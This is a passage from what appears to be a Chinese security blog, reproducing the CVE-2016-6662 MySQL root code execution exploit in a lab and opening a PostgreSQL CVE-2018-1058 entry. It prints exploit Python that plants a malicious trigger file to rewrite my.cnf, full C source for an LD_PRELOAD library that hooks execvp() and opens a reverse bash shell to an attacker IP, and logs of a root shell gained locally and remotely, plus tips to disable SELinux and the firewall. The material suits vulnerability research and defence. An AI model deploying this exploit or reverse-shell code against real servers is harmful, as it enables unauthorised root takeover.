&#123;&#125;"</span>.format(err))</span><br><span class="line">    shutdown(<span class="number">5</span>)</span><br></pre></td></tr></table></figure>
</li>
<li><p>创建trigger，绕过<code>SUPER</code>权限，设置<code>general_log_file</code>；</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># Trigger payload that will elevate user privileges and sucessfully execute SET GLOBAL GENERAL_LOG </span></span><br><span class="line"><span class="comment"># in spite of the lack of SUPER/admin privileges (attacker only needs SELECT/FILE privileges).</span></span><br><span class="line"><span class="comment"># Decoded payload (paths may differ) will look similar to:</span></span><br><span class="line"><span class="string">"""</span></span><br><span class="line"><span class="string">DELIMITER //</span></span><br><span class="line"><span class="string">CREATE DEFINER=`root`@`localhost` TRIGGER appendToConf</span></span><br><span class="line"><span class="string">AFTER INSERT</span></span><br><span class="line"><span class="string">   ON `poctable` FOR EACH ROW</span></span><br><span class="line"><span class="string">BEGIN</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">   DECLARE void varchar(550);</span></span><br><span class="line"><span class="string">   set global general_log_file='/var/lib/mysql/my.cnf';</span></span><br><span class="line"><span class="string">   set global general_log = on;</span></span><br><span class="line"><span class="string">   select "</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string"># 0ldSQL_MySQL_RCE_exploit got here :)</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">[mysqld]</span></span><br><span class="line"><span class="string">malloc_lib='/var/lib/mysql/mysql_hookandroot_lib.so'</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">[abyss]</span></span><br><span class="line"><span class="string">" INTO void;   </span></span><br><span class="line"><span class="string">   set global general_log = off;</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">END; //</span></span><br><span class="line"><span class="string">DELIMITER ;</span></span><br><span class="line"><span class="string">"""</span></span><br><span class="line">trigger_payload=<span class="string">"""TYPE=TRIGGERS</span></span><br><span class="line"><span class="string">triggers='CREATE DEFINER=`root`@`localhost` TRIGGER appendToConf\\nAFTER INSERT\\n   ON `poctable` FOR EACH ROW\\nBEGIN\\n\\n   DECLARE void varchar(550);\\n   set global general_log_file=\\'%s\\';\\n   set global general_log = on;\\n   select "\\n\\n# 0ldSQL_MySQL_RCE_exploit got here :)\\n\\n[mysqld]\\nmalloc_lib=\\'%s\\'\\n\\n[abyss]\\n" INTO void;   \\n   set global general_log = off;\\n\\nEND'</span></span><br><span class="line"><span class="string">sql_modes=0</span></span><br><span class="line"><span class="string">definers='root@localhost'</span></span><br><span class="line"><span class="string">client_cs_names='utf8'</span></span><br><span class="line"><span class="string">connection_cl_names='utf8_general_ci'</span></span><br><span class="line"><span class="string">db_cl_names='latin1_swedish_ci'</span></span><br><span class="line"><span class="string">"""</span> % (args.TARGET_MYCNF, malloc_lib_path)</span><br><span class="line"></span><br><span class="line"><span class="comment"># Convert trigger into HEX to pass it to unhex() SQL function</span></span><br><span class="line">trigger_payload_hex = <span class="string">""</span>.join(<span class="string">"&#123;:02x&#125;"</span>.format(ord(c)) <span class="keyword">for</span> c <span class="keyword">in</span> trigger_payload)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># Save trigger into a trigger file</span></span><br><span class="line">TRG_path=<span class="string">"/var/lib/mysql/%s/poctable.TRG"</span> % args.TARGET_DB</span><br><span class="line">info(<span class="string">"Saving trigger payload into %s"</span> % (TRG_path))</span><br><span class="line"><span class="keyword">try</span>:</span><br><span class="line">    cursor = dbconn.cursor()</span><br><span class="line">    cursor.execute(<span class="string">"""SELECT unhex("%s") INTO DUMPFILE '%s' """</span> % (trigger_payload_hex, TRG_path) )</span><br><span class="line"><span class="keyword">except</span> mysql.connector.Error <span class="keyword">as</span> err:</span><br><span class="line">    errmsg(<span class="string">"Something went wrong: &#123;&#125;"</span>.format(err))</span><br><span class="line">    shutdown(<span class="number">4</span>)</span><br><span class="line">    </span><br><span class="line"><span class="comment"># Creating table poctable so that /var/lib/mysql/pocdb/poctable.TRG trigger gets loaded by the server</span></span><br><span class="line">info(<span class="string">"Creating table 'poctable' so that injected 'poctable.TRG' trigger gets loaded"</span>)</span><br><span class="line"><span class="keyword">try</span>:</span><br><span class="line">    cursor = dbconn.cursor()</span><br><span class="line">    cursor.execute(<span class="string">"CREATE TABLE `poctable` (line varchar(600)) ENGINE='MyISAM'"</span>  )</span><br><span class="line"><span class="keyword">except</span> mysql.connector.Error <span class="keyword">as</span> err:</span><br><span class="line">    errmsg(<span class="string">"Something went wrong: &#123;&#125;"</span>.format(err))</span><br><span class="line">    shutdown(<span class="number">6</span>)</span><br><span class="line">   </span><br><span class="line"><span class="comment"># Finally, execute the trigger's payload by inserting anything into `poctable`. </span></span><br><span class="line"><span class="comment"># The payload will write to the mysql config file at this point.</span></span><br><span class="line">info(<span class="string">"Inserting data to `poctable` in order to execute the trigger and write data to the target mysql config %s"</span> % args.TARGET_MYCNF )</span><br><span class="line"><span class="keyword">try</span>:</span><br><span class="line">    cursor = dbconn.cursor()</span><br><span class="line">    cursor.execute(<span class="string">"INSERT INTO `poctable` VALUES('execute the trigger!');"</span> )</span><br><span class="line"><span class="keyword">except</span> mysql.connector.Error <span class="keyword">as</span> err:</span><br><span class="line">    errmsg(<span class="string">"Something went wrong: &#123;&#125;"</span>.format(err))</span><br><span class="line">    shutdown(<span class="number">6</span>)</span><br></pre></td></tr></table></figure>
</li>
</ul>
</li>
<li><p>恶意代码<code>mysql_hookandroot_lib.c</code></p>
<ul>
<li><p>反弹shell；</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">define</span> ATTACKERS_IP <span class="meta-string">"127.0.0.1"</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> SHELL_PORT 6033</span></span><br><span class="line"><span class="keyword">char</span>* env_list[] = &#123; <span class="string">"HOME=/root"</span>, <span class="literal">NULL</span> &#125;;</span><br><span class="line"></span><br><span class="line"><span class="comment">// fork &amp; send a bash shell to the attacker before starting mysqld</span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">reverse_shell</span><span class="params">(<span class="keyword">void</span>)</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">int</span> i; <span class="keyword">int</span> sockfd;</span><br><span class="line">    <span class="comment">//socklen_t socklen;</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">sockaddr_in</span> <span class="title">srv_addr</span>;</span></span><br><span class="line">    srv_addr.sin_family = AF_INET; </span><br><span class="line">    srv_addr.sin_port = htons( SHELL_PORT ); <span class="comment">// connect-back port</span></span><br><span class="line">    srv_addr.sin_addr.s_addr = inet_addr(ATTACKERS_IP); <span class="comment">// connect-back ip </span></span><br><span class="line"></span><br><span class="line">    <span class="comment">// create new TCP socket &amp;&amp; connect</span></span><br><span class="line">    sockfd = socket( AF_INET, SOCK_STREAM, IPPROTO_IP );</span><br><span class="line">    <span class="built_in">connect</span>(sockfd, (struct sockaddr *)&amp;srv_addr, <span class="keyword">sizeof</span>(srv_addr));</span><br><span class="line">	</span><br><span class="line">    <span class="keyword">for</span>(i = <span class="number">0</span>; i &lt;= <span class="number">2</span>; i++) dup2(sockfd, i);</span><br><span class="line">    execle( <span class="string">"/bin/bash"</span>, <span class="string">"/bin/bash"</span>, <span class="string">"-i"</span>, <span class="literal">NULL</span>, env_list );</span><br><span class="line"></span><br><span class="line">    <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
</li>
<li><p>清理配置文件<code>my.cnf</code>里多余内容，使<code>mysqld</code>能够正常运行；</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> cleanup injected data from the target config before it is read by mysqld</span></span><br><span class="line"><span class="comment"> in order to ensure clean startup of the service</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment"> The injection (if done via logging) will start with a line like this:</span></span><br><span class="line"><span class="comment"> /usr/sbin/mysqld, Version: 5.5.50-0+deb8u1 ((Debian)). started with:</span></span><br><span class="line"><span class="comment"> </span></span><br><span class="line"><span class="comment"> 找到 /usr/sbin/mysqld, Version 这一行，然后把这一行往后的文件内容删掉</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">config_cleanup</span><span class="params">()</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">    FILE *conf;</span><br><span class="line">    <span class="keyword">char</span> <span class="built_in">buffer</span>[<span class="number">2000</span>];</span><br><span class="line">    <span class="keyword">long</span> cut_offset=<span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">    conf = fopen(INJECTED_CONF, <span class="string">"r+"</span>);</span><br><span class="line">    <span class="keyword">if</span> (!conf) <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">while</span> (!feof(conf)) &#123;</span><br><span class="line">       fgets(<span class="built_in">buffer</span>, <span class="keyword">sizeof</span>(<span class="built_in">buffer</span>), conf);</span><br><span class="line">       <span class="keyword">if</span> (<span class="built_in">strstr</span>(<span class="built_in">buffer</span>,<span class="string">"/usr/sbin/mysqld, Version"</span>)) &#123;</span><br><span class="line">	  cut_offset = (ftell(conf) - <span class="built_in">strlen</span>(<span class="built_in">buffer</span>));</span><br><span class="line">       &#125;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> (cut_offset&gt;<span class="number">0</span>) ftruncate(fileno(conf), cut_offset);</span><br><span class="line">    fclose(conf);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
</li>
<li><p>hook <code>execvp()</code>，调用<code>config_cleanup()</code>和<code>reverse_shell()</code>；</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">// execvp() hook</span></span><br><span class="line"><span class="function"><span class="keyword">typedef</span> <span class="title">ssize_t</span> <span class="params">(*<span class="keyword">execvp_func_t</span>)</span><span class="params">(<span class="keyword">const</span> <span class="keyword">char</span> *__file, <span class="keyword">char</span> *<span class="keyword">const</span> __argv[])</span></span>;</span><br><span class="line"><span class="keyword">static</span> <span class="keyword">execvp_func_t</span> old_execvp = <span class="literal">NULL</span>;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">execvp</span><span class="params">(<span class="keyword">const</span> <span class="keyword">char</span>* filename, <span class="keyword">char</span>* <span class="keyword">const</span> argv[])</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// int fd;</span></span><br><span class="line">    <span class="comment">// Simple root PoC (touch /root/root_via_mysql)</span></span><br><span class="line">    <span class="comment">// fd = open("/root/root_via_mysql", O_CREAT);</span></span><br><span class="line">    <span class="comment">// close(fd);</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">// clean injected payload before mysqld is started</span></span><br><span class="line">    config_cleanup();</span><br><span class="line">  </span><br><span class="line">    <span class="keyword">pid_t</span>  pid;</span><br><span class="line">    old_execvp = dlsym(RTLD_NEXT, <span class="string">"execvp"</span>);</span><br><span class="line">    <span class="comment">// Fork a reverse shell and execute the original execvp() function</span></span><br><span class="line">    pid = fork();</span><br><span class="line">    <span class="keyword">if</span> (pid == <span class="number">0</span>) </span><br><span class="line">          reverse_shell();</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">return</span> old_execvp(filename, argv);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>


</li>
</ul>
</li>
</ol>
<h3 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h3><ul>
<li><p>用<code>mysqld_safe</code>管理<code>mysqld</code>进程；</p>
</li>
<li><p><code>mysqld_safe</code>支持任意路径加载共享库，而且<code>mysqld_safe</code>是<code>root</code>用户启动；</p>
</li>
<li><p><code>mysqld_safe</code>读取配置文件<code>my.cnf</code>，设定启动参数；</p>
</li>
<li><p>利用<code>FILE</code>权限，新建<code>TRIGGERS</code>来设置<code>general_log_file</code>和写入共享库文件<code>mysql_hookandroot_lib.so</code>；</p>
</li>
<li><p>共享库通过hook <code>execvp()</code>，来触发反弹shell；</p>
</li>
</ul>
<h2 id="0x03-攻击复现（本地）"><a href="#0x03-攻击复现（本地）" class="headerlink" title="0x03 攻击复现（本地）"></a>0x03 攻击复现（本地）</h2><p>操作系统：CentOS 7.6</p>
<p>MySQL 版本：5.6.32</p>
<h3 id="准备"><a href="#准备" class="headerlink" title="准备"></a>准备</h3><ul>
<li>安装好MySQL后，查找<code>root</code>默认密码，登录数据库并修改密码；</li>
<li>创建<code>evil</code>数据库；</li>
<li>创建<code>hacker</code>用户，并赋予<code>FILE</code>和<code>evil</code>数据库的<code>SELECT</code>, <code>INSERT</code>, <code>CREATE</code>权限。</li>
</ul>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">[root@localhost ~]# cat /root/.mysql_secret</span><br><span class="line"><span class="meta">#</span><span class="bash"> The random password <span class="built_in">set</span> <span class="keyword">for</span> the root user at Wed Mar  4 08:45:52 2020 (<span class="built_in">local</span> time): nYoQpyVjmlsnR5nw</span></span><br><span class="line">[root@localhost usr]# mysql -u root -p </span><br><span class="line">Enter password: </span><br><span class="line">Welcome to the MySQL monitor.  Commands end with ; or \g.</span><br><span class="line">Your MySQL connection id is 4</span><br><span class="line">Server version: 5.6.32</span><br><span class="line"></span><br><span class="line">Copyright (c) 2000, 2016, Oracle and/or its affiliates. All rights reserved.</span><br><span class="line"></span><br><span class="line">Oracle is a registered trademark of Oracle Corporation and/or its</span><br><span class="line">affiliates. Other names may be trademarks of their respective</span><br><span class="line">owners.</span><br><span class="line"></span><br><span class="line">Type 'help;' or '\h' for help. Type '\c' to clear the current input statement.</span><br><span class="line"><span class="meta">mysql&gt;</span><span class="bash"> SET password=password(<span class="string">'mysql@2020'</span>);</span></span><br><span class="line">Query OK, 0 rows affected (0.02 sec)</span><br><span class="line"></span><br><span class="line"><span class="meta">mysql&gt;</span><span class="bash"> CREATE DATABASE evil;</span></span><br><span class="line">Query OK, 1 row affected (0.03 sec)</span><br><span class="line"></span><br><span class="line"><span class="meta">mysql&gt;</span><span class="bash"> CREATE USER <span class="string">'hacker'</span>@<span class="string">'%'</span> IDENTIFIED BY <span class="string">'hacker@2020'</span>;</span></span><br><span class="line">Query OK, 0 rows affected (0.02 sec)</span><br><span class="line"></span><br><span class="line"><span class="meta">mysql&gt;</span><span class="bash"> GRANT FILE ON *.* TO <span class="string">'hacker'</span>@<span class="string">'%'</span>;</span></span><br><span class="line">Query OK, 0 rows affected (0.00 sec)</span><br><span class="line"></span><br><span class="line"><span class="meta">mysql&gt;</span><span class="bash"> GRANT SELECT, INSERT, CREATE ON `evil`.* TO <span class="string">'hacker'</span>@<span class="string">'%'</span>; </span></span><br><span class="line">Query OK, 0 rows affected (0.00 sec)</span><br></pre></td></tr></table></figure>

<h3 id="攻击"><a href="#攻击" class="headerlink" title="攻击"></a>攻击</h3><ul>
<li><p>修改<code>0ldSQL_MySQL_RCE_exploit.py</code>，将<code>trigger_payload</code>的<code>[mysqld]</code>改为<code>[mysqld_safe]</code>，因为 5.6 版本是这样<a href="https://dev.mysql.com/doc/refman/5.6/en/mysqld-safe.html" target="_blank" rel="noopener">规定</a><code>mysqld_safe</code>的参数。</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">trigger_payload="""TYPE=TRIGGERS</span><br><span class="line">triggers='CREATE DEFINER=`root`@`localhost` TRIGGER appendToConf\\nAFTER INSERT\\n   ON `poctable` FOR EACH ROW\\nBEGIN\\n\\n   DECLARE void varchar(550);\\n   set global general_log_file=\\'%s\\';\\n   set global general_log = on;\\n   select "\\n\\n# 0ldSQL_MySQL_RCE_exploit got here :)\\n\\n[mysqld_safe]\\nmalloc_lib=\\'%s\\'\\n\\n[abyss]\\n" INTO void;   \\n   set global general_log = off;\\n\\nEND'</span><br><span class="line">sql_modes=0</span><br><span class="line">definers='root@localhost'</span><br><span class="line">client_cs_names='utf8'</span><br><span class="line">connection_cl_names='utf8_general_ci'</span><br><span class="line">db_cl_names='latin1_swedish_ci'</span><br><span class="line">""" % (args.TARGET_MYCNF, malloc_lib_path)</span><br></pre></td></tr></table></figure>
</li>
<li><p>修改<code>mysql_hookandroot_lib.c</code>，将<code>config_cleanup</code>放在反弹shell前执行，这样可以保证<code>my.cnf</code>的还原。</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">// execvp() hook</span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">execvp</span><span class="params">(<span class="keyword">const</span> <span class="keyword">char</span>* filename, <span class="keyword">char</span>* <span class="keyword">const</span> argv[])</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">pid_t</span>  pid;</span><br><span class="line">    <span class="comment">// int fd;</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">// Simple root PoC (touch /root/root_via_mysql)</span></span><br><span class="line">    <span class="comment">//fd = open("/root/root_via_mysql", O_CREAT);</span></span><br><span class="line">    <span class="comment">//close(fd);</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">// clean injected payload before mysqld is started</span></span><br><span class="line">    config_cleanup();</span><br><span class="line">    old_execvp = dlsym(RTLD_NEXT, <span class="string">"execvp"</span>);</span><br><span class="line">    <span class="comment">// Fork a reverse shell and execute the original execvp() function</span></span><br><span class="line">    pid = fork();</span><br><span class="line">    <span class="keyword">if</span> (pid == <span class="number">0</span>) </span><br><span class="line">          reverse_shell();</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> old_execvp(filename, argv);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
</li>
<li><p>运行<code>0ldSQL_MySQL_RCE_exploit.py</code></p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">[root@localhost cve-2016-6662]# python 0ldSQL_MySQL_RCE_exploit.py -dbuser hacker -dbpass 'hacker@2020' -dbhost 127.0.0.1 -dbname evil -mycnf /var/lib/mysql/my.cnf</span><br><span class="line"></span><br><span class="line">0ldSQL_MySQL_RCE_exploit.py (ver. 1.0)</span><br><span class="line">(CVE-2016-6662) MySQL Remote Root Code Execution / Privesc PoC Exploit</span><br><span class="line"></span><br><span class="line">For testing purposes only. Do no harm.</span><br><span class="line"></span><br><span class="line">Discovered/Coded by:</span><br><span class="line"></span><br><span class="line">Dawid Golunski</span><br><span class="line">http://legalhackers.com</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">[+] Connecting to target server 127.0.0.1 and target mysql account 'hacker@127.0.0.1' using DB 'evil'</span><br><span class="line"></span><br><span class="line">[+] The account in use has the following grants/perms: </span><br><span class="line"></span><br><span class="line">GRANT FILE ON *.* TO 'hacker'@'%' IDENTIFIED BY PASSWORD &lt;secret&gt;</span><br><span class="line">GRANT SELECT, INSERT, CREATE ON `evil`.* TO 'hacker'@'%'</span><br><span class="line"></span><br><span class="line">[+] Compiling mysql_hookandroot_lib.so</span><br><span class="line"></span><br><span class="line">[+] Converting mysql_hookandroot_lib.so into HEX</span><br><span class="line"></span><br><span class="line">[+] Saving trigger payload into /var/lib/mysql/evil/poctable.TRG</span><br><span class="line"></span><br><span class="line">[+] Dumping shared library into /var/lib/mysql/mysql_hookandroot_lib.so file on the target</span><br><span class="line"></span><br><span class="line">[+] Creating table 'poctable' so that injected 'poctable.TRG' trigger gets loaded</span><br><span class="line"></span><br><span class="line">[+] Inserting data to `poctable` in order to execute the trigger and write data to the target mysql config /var/lib/mysql/my.cnf</span><br><span class="line"></span><br><span class="line">[+] Everything is set up and ready. Spawning netcat listener and waiting for MySQL daemon to get restarted to get our rootshell... :)</span><br><span class="line"></span><br><span class="line">Ncat: Version 7.50 ( https://nmap.org/ncat )</span><br><span class="line">Ncat: Listening on :::6033</span><br><span class="line">Ncat: Listening on 0.0.0.0:6033</span><br></pre></td></tr></table></figure>
</li>
<li><p>重启<code>MySQL</code>服务：<code>service mysql restart</code>，接收到反弹shell连接。</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">Ncat: Connection from 127.0.0.1.</span><br><span class="line">Ncat: Connection from 127.0.0.1:46300.</span><br><span class="line">[root@localhost usr]# id</span><br><span class="line">id</span><br><span class="line">uid&#x3D;0(root) gid&#x3D;0(root) groups&#x3D;0(root) context&#x3D;unconfined_u:system_r:mysqld_safe_t:s0</span><br></pre></td></tr></table></figure>



</li>
</ul>
<h2 id="0x04-攻击复现（远程）"><a href="#0x04-攻击复现（远程）" class="headerlink" title="0x04 攻击复现（远程）"></a>0x04 攻击复现（远程）</h2><p>攻击目标</p>
<ul>
<li><p>操作系统：CentOS 7.6</p>
</li>
<li><p>MySQL版本：5.6.32</p>
</li>
<li><p>IP地址：192.168.187.198</p>
</li>
</ul>
<p>攻击者</p>
<ul>
<li>IP地址：192.168.187.197</li>
</ul>
<h3 id="准备-1"><a href="#准备-1" class="headerlink" title="准备"></a>准备</h3><ul>
<li>开启MySQL远程访问</li>
<li>其他准备同 0x03 攻击复现（本地）</li>
</ul>
<h3 id="攻击-1"><a href="#攻击-1" class="headerlink" title="攻击"></a>攻击</h3><ul>
<li><p>攻击者编译<code>mysql_hookandroot_lib.c</code>（对应攻击目标的系统）；</p>
<p><code>gcc -Wall -fPIC -shared -o mysql_hookandroot_lib.so mysql_hookandroot_lib.c -ldl</code></p>
</li>
<li><p>攻击者修改<code>0ldSQL_MySQL_RCE_exploit.py</code>，注释掉编译so的代码；</p>
</li>
<li><p>攻击者修改<code>mysql_hookandroot_lib.c</code>里反弹shell连接的IP；</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">define</span> ATTACKERS_IP <span class="meta-string">"192.168.187.197"</span></span></span><br></pre></td></tr></table></figure>
</li>
<li><p>攻击者运行<code>0ldSQL_MySQL_RCE_exploit.py</code>；</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">fen@kaliForFun:~/cve-2016-6662$ python 0ldSQL_MySQL_RCE_exploit.py -dbuser hacker -dbpass 'hacker@2020' -dbhost 192.168.187.198 -dbname evil -mycnf /var/lib/mysql/my.cnf</span><br><span class="line"></span><br><span class="line">0ldSQL_MySQL_RCE_exploit.py (ver. 1.0)</span><br><span class="line">(CVE-2016-6662) MySQL Remote Root Code Execution / Privesc PoC Exploit</span><br><span class="line"></span><br><span class="line">For testing purposes only. Do no harm.</span><br><span class="line"></span><br><span class="line">Discovered/Coded by:</span><br><span class="line"></span><br><span class="line">Dawid Golunski</span><br><span class="line">http://legalhackers.com</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">[+] Connecting to target server 192.168.187.198 and target mysql account 'hacker@192.168.187.198' using DB 'evil'</span><br><span class="line"></span><br><span class="line">[+] The account in use has the following grants/perms: </span><br><span class="line"></span><br><span class="line">GRANT FILE ON *.* TO 'hacker'@'%' IDENTIFIED BY PASSWORD &lt;secret&gt;</span><br><span class="line">GRANT SELECT, INSERT, CREATE ON `evil`.* TO 'hacker'@'%'</span><br><span class="line"></span><br><span class="line">[+] Converting mysql_hookandroot_lib.so into HEX</span><br><span class="line"></span><br><span class="line">[+] Saving trigger payload into /var/lib/mysql/evil/poctable.TRG</span><br><span class="line"></span><br><span class="line">[+] Dumping shared library into /var/lib/mysql/mysql_hookandroot_lib.so file on the target</span><br><span class="line"></span><br><span class="line">[+] Creating table 'poctable' so that injected 'poctable.TRG' trigger gets loaded</span><br><span class="line"></span><br><span class="line">[+] Inserting data to `poctable` in order to execute the trigger and write data to the target mysql config /var/lib/mysql/my.cnf</span><br><span class="line"></span><br><span class="line">[+] Everything is set up and ready. Spawning netcat listener and waiting for MySQL daemon to get restarted to get our rootshell... :)</span><br><span class="line"></span><br><span class="line">Ncat: Version 7.80 ( https://nmap.org/ncat )</span><br><span class="line">Ncat: Listening on :::6033</span><br><span class="line">Ncat: Listening on 0.0.0.0:6033</span><br></pre></td></tr></table></figure>
</li>
<li><p>攻击目标重启<code>MySQL</code>服务：<code>service mysql restart</code>，接收到反弹shell连接。</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta">#</span><span class="bash"> 攻击目标</span></span><br><span class="line">[root@localhost ~]# service mysql restart</span><br><span class="line">Shutting down MySQL.... SUCCESS! </span><br><span class="line">Starting MySQL....... SUCCESS! </span><br><span class="line"></span><br><span class="line"><span class="meta">#</span><span class="bash"> 攻击者</span></span><br><span class="line">Ncat: Version 7.80 ( https://nmap.org/ncat )</span><br><span class="line">Ncat: Listening on :::6033</span><br><span class="line">Ncat: Listening on 0.0.0.0:6033</span><br><span class="line">Ncat: Connection from 192.168.187.198.</span><br><span class="line">Ncat: Connection from 192.168.187.198:36660.</span><br><span class="line">[root@localhost usr]# id</span><br><span class="line">id</span><br><span class="line">uid=0(root) gid=0(root) groups=0(root) context=unconfined_u:system_r:mysqld_safe_t:s0</span><br></pre></td></tr></table></figure>



</li>
</ul>
<h2 id="0x05-Q-amp-A"><a href="#0x05-Q-amp-A" class="headerlink" title="0x05 Q&amp;A"></a>0x05 Q&amp;A</h2><ul>
<li><p>为什么装了漏洞版本的 MySQL，但没有mysqld_safe？</p>
<ul>
<li>如果操作系统用systemd管理MySQL，就不会安装<code>mysqld_safe</code>。</li>
</ul>
<blockquote>
<p>For some Linux platforms, MySQL installation from RPM or Debian packages includes systemd support for managing MySQL server startup and shutdown. On these platforms, mysqld_safe is not installed because it is unnecessary. For more information, see Section 2.5.10, “Managing MySQL Server with systemd”. </p>
<p><a href="https://dev.mysql.com/doc/refman/5.7/en/mysqld-safe.html" target="_blank" rel="noopener">https://dev.mysql.com/doc/refman/5.7/en/mysqld-safe.html</a></p>
<p><a href="https://mysqlserverteam.com/mysql-5-7-native-systemd-support/" target="_blank" rel="noopener">https://mysqlserverteam.com/mysql-5-7-native-systemd-support/</a></p>
</blockquote>
</li>
<li><p>ImportError: No module named mysql.connector</p>
<ul>
<li><p>没有安装 python库 ：<a href="https://dev.mysql.com/doc/connector-python/en/" target="_blank" rel="noopener">mysql-connector-python</a></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">pip install mysql-connector-python</span><br></pre></td></tr></table></figure>
</li>
</ul>
</li>
<li><p>存在两个<code>my.cnf</code>，导致远程写入的配置未生效。</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">200304 19:29:24 mysqld_safe WARNING: Found two instances of my.cnf -</span><br><span class="line">/usr/my.cnf and</span><br><span class="line">/var/lib/mysql/my.cnf</span><br><span class="line">IGNORING /var/lib/mysql/my.cnf</span><br></pre></td></tr></table></figure>

<ul>
<li>把<code>/usr/my.cnf</code>移动到<code>/var/lib/mysql/</code></li>
<li>或者将<code>DATADIR</code>设置为<code>/usr/data</code></li>
</ul>
</li>
<li><p>MySQL无法外联</p>
<p>远程连接不上MySQL数据库</p>
<ul>
<li><p>关闭防火墙 <code>systemctl stop firewalld</code></p>
</li>
<li><p>或者开放端口</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">firewall-cmd --zone&#x3D;public --add-port&#x3D;3306&#x2F;tcp --permanent</span><br><span class="line">firewall-cmd --reload</span><br></pre></td></tr></table></figure>
</li>
</ul>
</li>
<li><p>共享库加载失败</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">200305 06:24:23 mysqld_safe Starting mysqld daemon with databases from /var/lib/mysql</span><br><span class="line">ERROR: ld.so: object '/var/lib/mysql/mysql_hookandroot_lib.so' from LD_PRELOAD cannot be preloaded: ignored.</span><br></pre></td></tr></table></figure>

<ul>
<li>关闭<code>SELinux</code>：<code>sudo setenforce 0</code></li>
</ul>
</li>
<li><p>利用LD_PRELOAD进行Hook</p>
<blockquote>
<p>在UNIX的动态链接库的世界中，LD_PRELOAD就是这样一个环境变量，它可以影响程序的运行时的链接（Runtime  linker），它允许你定义在程序运行前优先加载的动态链接库。这个功能主要就是用来有选择性的载入不同动态链接库中的相同函数。通过这个环境变量，我们可以在主程序和其动态链接库的中间加载别的动态链接库，甚至覆盖正常的函数库。</p>
<p><a href="https://www.cnblogs.com/eaglexmw/p/10403148.html" target="_blank" rel="noopener">https://www.cnblogs.com/eaglexmw/p/10403148.html</a></p>
</blockquote>
</li>
</ul>
<p><strong>总结：系统和应用本身用了很多措施来保障安全。即便是有漏洞的情况下，也不见得攻击成功。所以，一些不安全事件的发生，绝不是单纯一个漏洞导致的，是多个环节的疏忽。</strong></p>
]]></content>
      <categories>
        <category>漏洞研究</category>
      </categories>
      <tags>
        <tag>MySQL</tag>
      </tags>
  </entry>
  <entry>
    <title>Postgresql CVE-2018-1058 漏洞分析与利用</title>
    <url>/zh-CN/cve-2018-1058.html</url>
    <content><![CDATA[<p>基于该文《<a href="https://xz.aliyun.com/t/2109" target="_blank" rel="noopener">PostgreSQL 远程代码执行漏洞分析及利用—【CVE-2018-1058】</a> 》，对 Postgresql CVE-2018-1058 漏洞进行研究。</p>
<p>在此，感谢大佬chybeta的分享。</p>
<h2 id="0x01-漏洞介绍"><a href="#0x01-漏洞介绍" class="headerlink" title="0x01 漏洞介绍"></a>0x01 漏洞介绍</h2><ul>
<li><p>CVE：<a href="http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2018-1058" target="_blank" rel="noopener">CVE-2018-1058</a></p>
</li>
<li><p>Postgresql</p>
<ul>
<li><p><a href="https://www.postgresql.org/about/news/1834/" target="_blank" rel="noopener">官方说法</a>：CVE-2018-1058: 在pg_dump与其他客户端应用里不可控的 search path。（渣翻）</p>
<blockquote>
<p>CVE-2018-1058: Uncontrolled search path element in pg_dump and other client applications</p>
